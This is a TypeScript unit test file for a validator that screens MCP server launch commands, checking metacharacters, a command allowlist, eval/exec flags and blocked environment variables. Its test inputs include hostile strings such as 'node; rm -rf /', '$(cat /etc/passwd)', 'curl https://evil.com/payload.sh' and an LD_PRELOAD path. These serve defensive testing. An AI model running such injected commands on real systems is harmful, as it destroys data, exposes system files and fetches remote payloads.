/**
 * Command Validation Unit Tests — downstream/types.ts
 *
 * Covers F-SEC-M6-001 security fixes:
 *   - All command array elements validated for shell metacharacters
 *   - Base command allowlist enforcement (MCP_ALLOWED_COMMANDS override)
 *   - Dangerous eval/exec argument patterns rejected
 *   - Real community registry entries still pass
 *
 * @see SEC-FIX-001, SEC-FIX-002, SEC-FIX-003
 */

import { describe, it, expect, afterEach } from 'vitest';
import {
  validateMcpConfig,
  containsShellMetacharacters,
  isDangerousArgument,
  getAllowedCommands,
  DEFAULT_ALLOWED_COMMANDS,
} from '../../src/downstream/types.js';
import type { DownstreamMcpConfig } from '../../src/downstream/types.js';

/** Build a minimal DownstreamMcpConfig for stdio transport. */
function makeStdioConfig(command: string[], env?: Record<string, string>): DownstreamMcpConfig {
  return {
    name: 'test-mcp',
    transport: 'stdio',
    command,
    env,
  };
}

// ---------------------------------------------------------------------------
// Unit helpers
// ---------------------------------------------------------------------------

describe('containsShellMetacharacters', () => {
  it('returns false for clean strings', () => {
    expect(containsShellMetacharacters('npx')).toBe(false);
    expect(containsShellMetacharacters('-y')).toBe(false);
    expect(containsShellMetacharacters('@scope/package@latest')).toBe(false);
    expect(containsShellMetacharacters('some-server@1.2.3')).toBe(false);
    expect(containsShellMetacharacters('/allowed/path')).toBe(false);
    expect(containsShellMetacharacters('--headless')).toBe(false);
  });

  it('returns true for semicolon', () => {
    expect(containsShellMetacharacters('node; rm -rf /')).toBe(true);
  });

  it('returns true for pipe', () => {
    expect(containsShellMetacharacters('mcp | cat /etc/passwd')).toBe(true);
  });

  it('returns true for ampersand', () => {
    expect(containsShellMetacharacters('mcp & curl evil.com')).toBe(true);
  });

  it('returns true for backtick', () => {
    expect(containsShellMetacharacters('`whoami`')).toBe(true);
  });

  it('returns true for dollar sign', () => {
    expect(containsShellMetacharacters('$(cat /etc/passwd)')).toBe(true);
  });

  it('returns true for redirection operators', () => {
    expect(containsShellMetacharacters('arg > /etc/cron.d/evil')).toBe(true);
    expect(containsShellMetacharacters('arg < /etc/passwd')).toBe(true);
  });

  it('returns true for embedded newline', () => {
    expect(containsShellMetacharacters('arg\ncurl evil.com')).toBe(true);
  });
});

describe('isDangerousArgument', () => {
  it('returns false for safe args', () => {
    expect(isDangerousArgument('-y')).toBe(false);
    expect(isDangerousArgument('--headless')).toBe(false);
    expect(isDangerousArgument('server.js')).toBe(false);
    expect(isDangerousArgument('/allowed/path')).toBe(false);
    expect(isDangerousArgument('@scope/package@latest')).toBe(false);
  });

  it('returns true for -e (short eval flag)', () => {
    expect(isDangerousArgument('-e')).toBe(true);
  });

  it('returns true for --eval (long eval flag)', () => {
    expect(isDangerousArgument('--eval')).toBe(true);
  });

  it('returns true for -c (inline code flag)', () => {
    expect(isDangerousArgument('-c')).toBe(true);
  });

  it('returns true for strings containing eval()', () => {
    expect(isDangerousArgument('eval(process.env.SECRET)')).toBe(true);
    expect(isDangerousArgument('--hook=eval(code)')).toBe(true);
  });

  it('returns true for strings containing exec()', () => {
    expect(isDangerousArgument('exec(command)')).toBe(true);
    expect(isDangerousArgument('--preload=exec(code)')).toBe(true);
  });
});

describe('getAllowedCommands', () => {
  afterEach(() => {
    delete process.env['MCP_ALLOWED_COMMANDS'];
  });

  it('returns the default allowlist when env var is unset', () => {
    delete process.env['MCP_ALLOWED_COMMANDS'];
    expect(getAllowedCommands()).toEqual(DEFAULT_ALLOWED_COMMANDS);
  });

  it('returns custom list from MCP_ALLOWED_COMMANDS env var', () => {
    process.env['MCP_ALLOWED_COMMANDS'] = 'custom-runner,another-runner';
    expect(getAllowedCommands()).toEqual(['custom-runner', 'another-runner']);
  });

  it('trims whitespace from env var entries', () => {
    process.env['MCP_ALLOWED_COMMANDS'] = ' npx , uvx , bun ';
    expect(getAllowedCommands()).toEqual(['npx', 'uvx', 'bun']);
  });

  it('falls back to default when env var is empty string', () => {
    process.env['MCP_ALLOWED_COMMANDS'] = '';
    expect(getAllowedCommands()).toEqual(DEFAULT_ALLOWED_COMMANDS);
  });
});

// ---------------------------------------------------------------------------
// validateMcpConfig — downstream runtime validator
// ---------------------------------------------------------------------------

describe('validateMcpConfig (downstream/types)', () => {
  afterEach(() => {
    delete process.env['MCP_ALLOWED_COMMANDS'];
  });

  describe('basic stdio requirements', () => {
    it('accepts a well-formed stdio config', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['npx', '-y', 'some-mcp@latest']))
      ).not.toThrow();
    });

    it('throws when command array is missing', () => {
      expect(() => validateMcpConfig({ name: 'test', transport: 'stdio' })).toThrow(
        'stdio transport requires command array'
      );
    });

    it('throws when command array is empty', () => {
      expect(() => validateMcpConfig(makeStdioConfig([]))).toThrow(
        'stdio transport requires command array'
      );
    });

    it('throws when command[0] is blank', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['']))).toThrow('Empty command not allowed');
    });

    it('skips all checks for non-stdio transports', () => {
      expect(() =>
        validateMcpConfig({ name: 'test', transport: 'http', url: 'https://example.com' })
      ).not.toThrow();
    });
  });

  describe('SEC-FIX-001: shell metacharacter check covers all command elements', () => {
    it('throws for semicolon in command[0]', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['node; rm -rf /', 'server.js']))).toThrow(
        'shell metacharacters'
      );
    });

    it('throws for pipe in command[1] (argument)', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['npx', 'mcp-server | curl evil.com']))
      ).toThrow('shell metacharacters');
    });

    it('throws for backtick in command[2]', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['npx', '-y', '`whoami`']))).toThrow(
        'shell metacharacters'
      );
    });

    it('throws for dollar-sign expansion in argument', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['node', 'server.js', '--key=$(cat /etc/passwd)']))
      ).toThrow('shell metacharacters');
    });

    it('throws for ampersand in argument', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['uvx', 'server & curl evil.com']))).toThrow(
        'shell metacharacters'
      );
    });

    it('throws for newline embedded in argument', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['npx', '-y', 'mcp\ncurl evil.com']))).toThrow(
        'shell metacharacters'
      );
    });
  });

  describe('SEC-FIX-002: base command allowlist', () => {
    it('throws for bash (not in allowlist)', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['bash', '-c', 'evil']))).toThrow(
        'not in the allowed command list'
      );
    });

    it('throws for /bin/sh (not in allowlist)', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['/bin/sh', '-c', 'evil']))).toThrow(
        'not in the allowed command list'
      );
    });

    it('throws for curl (not in allowlist)', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['curl', 'https://evil.com/payload.sh']))
      ).toThrow('not in the allowed command list');
    });

    it('accepts all default allowlist commands', () => {
      for (const base of DEFAULT_ALLOWED_COMMANDS) {
        expect(() => validateMcpConfig(makeStdioConfig([base, 'safe-arg']))).not.toThrow();
      }
    });

    it('accepts a custom command when MCP_ALLOWED_COMMANDS is set', () => {
      process.env['MCP_ALLOWED_COMMANDS'] = 'my-runner';
      expect(() => validateMcpConfig(makeStdioConfig(['my-runner', 'safe-arg']))).not.toThrow();
    });

    it('rejects default commands when overridden by MCP_ALLOWED_COMMANDS', () => {
      process.env['MCP_ALLOWED_COMMANDS'] = 'only-this-runner';
      expect(() => validateMcpConfig(makeStdioConfig(['npx', '-y', 'some-mcp']))).toThrow(
        'not in the allowed command list'
      );
    });

    it('includes MCP_ALLOWED_COMMANDS hint in error message', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['evil-cmd', 'arg']))).toThrow(
        'MCP_ALLOWED_COMMANDS'
      );
    });
  });

  describe('SEC-FIX-003: dangerous eval/exec argument patterns', () => {
    it('throws for node -e (inline eval bypass)', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['node', '-e', 'require("child_process").exec("evil")']))
      ).toThrow('dangerous eval/exec pattern');
    });

    it('throws for node --eval', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['node', '--eval', 'malicious()']))).toThrow(
        'dangerous eval/exec pattern'
      );
    });

    it('throws for python3 -c (inline code)', () => {
      // -c itself triggers the dangerous arg check regardless of the payload
      expect(() => validateMcpConfig(makeStdioConfig(['python3', '-c', 'print("hello")']))).toThrow(
        'dangerous eval/exec pattern'
      );
    });

    it('throws for python -c (inline code)', () => {
      expect(() => validateMcpConfig(makeStdioConfig(['python', '-c', 'print("hello")']))).toThrow(
        'dangerous eval/exec pattern'
      );
    });

    it('throws for argument containing eval()', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['node', 'server.js', '--hook=eval(code)']))
      ).toThrow('dangerous eval/exec pattern');
    });

    it('throws for argument containing exec()', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['node', 'server.js', '--preload=exec(cmd)']))
      ).toThrow('dangerous eval/exec pattern');
    });
  });

  describe('SEC-FIX-004: real community registry entries pass validation', () => {
    it('accepts: npx -y <package>@latest (airtable, arxiv, brave, etc.)', () => {
      const registryCommands = [
        ['npx', '-y', 'airtable-mcp-server@latest'],
        ['npx', '-y', 'arxiv-mcp-server@latest'],
        ['npx', '-y', '@brave/brave-search-mcp-server@latest'],
        ['npx', '-y', '@brave/brave-search-mcp-server'],
        ['npx', '-y', '@browserbasehq/mcp-server-browserbase@latest'],
        ['npx', '-y', 'clickhouse-mcp@latest'],
        ['npx', '-y', '@cloudflare/mcp-server-cloudflare'],
        ['npx', '-y', 'docker-mcp-server'],
        ['npx', '-y', 'duckduckgo-mcp@latest'],
        ['npx', '-y', '@modelcontextprotocol/server-everart'],
        ['npx', '-y', 'exa-mcp-server'],
        ['npx', '-y', 'figma-mcp-server'],
        ['npx', '-y', '@modelcontextprotocol/server-filesystem', '/allowed/path'],
        ['npx', '-y', 'firecrawl-mcp'],
        ['npx', '-y', '@modelcontextprotocol/server-google-maps'],
        ['npx', '-y', '@grafana/mcp-server'],
        ['npx', '-y', 'kubernetes-mcp-server@latest'],
        ['npx', '-y', '@modelcontextprotocol/server-memory'],
        ['npx', '-y', '@playwright/mcp@latest', '--headless'],
        ['npx', '-y', '@stripe/mcp'],
        ['npx', '-y', 'tavily-mcp@latest'],
      ];

      for (const cmd of registryCommands) {
        expect(() => validateMcpConfig(makeStdioConfig(cmd))).not.toThrow();
      }
    });

    it('accepts: uvx <package> (couchbase, github, Gmail, kubectl, etc.)', () => {
      const registryCommands = [
        ['uvx', 'couchbase-mcp-server'],
        ['uvx', 'mcp-db-server'],
        ['uvx', 'descope-mcp'],
        ['uvx', 'explorium-mcp-server'],
        ['uvx', 'mcp-server-fetch'],
        ['uvx', 'github-mcp-server'],
        ['uvx', 'Gmail-MCP'],
        ['uvx', 'kubectl-mcp-server'],
        ['uvx', 'markdownify-mcp-server'],
        ['uvx', 'markitdown-mcp'],
        ['uvx', 'mcp-discord'],
        ['uvx', 'mcp-reddit'],
        ['uvx', 'oxylabs-mcp'],
        ['uvx', 'mcp-server-sqlite'],
        ['uvx', 'stackhawk-mcp'],
        ['uvx', 'temporal-mcp-server'],
        ['uvx', 'text-to-graphql-mcp'],
        ['uvx', 'mcp-youtube-transcript'],
      ];

      for (const cmd of registryCommands) {
        expect(() => validateMcpConfig(makeStdioConfig(cmd))).not.toThrow();
      }
    });
  });

  describe('environment variable validation', () => {
    it('throws for blocked env var PATH', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['npx', 'mcp'], { PATH: '/malicious' }))
      ).toThrow("'PATH' is blocked");
    });

    it('throws for blocked env var LD_PRELOAD', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['npx', 'mcp'], { LD_PRELOAD: '/evil.so' }))
      ).toThrow("'LD_PRELOAD' is blocked");
    });

    it('throws for blocked env var NODE_OPTIONS', () => {
      expect(() =>
        validateMcpConfig(makeStdioConfig(['node', 'server.js'], { NODE_OPTIONS: '--inspect' }))
      ).toThrow("'NODE_OPTIONS' is blocked");
    });

    it('accepts safe env vars', () => {
      expect(() =>
        validateMcpConfig(
          makeStdioConfig(['npx', '-y', 'mcp'], { API_KEY: 'safe-value', DEBUG: '1' })
        )
      ).not.toThrow();
    });
  });
});
